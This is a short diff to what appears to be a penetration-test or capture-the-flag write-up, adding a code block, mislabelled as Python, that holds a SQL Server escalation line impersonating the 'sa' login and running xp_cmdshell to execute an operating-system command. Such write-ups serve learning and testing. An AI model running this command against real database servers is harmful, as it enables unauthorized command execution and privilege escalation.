@@ -250,5 +250,9 @@ I now have code execution
 
 However the user does not have SeImpersonatePrivilege
 
+```python
+EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'whoami';
+```
+
 
 
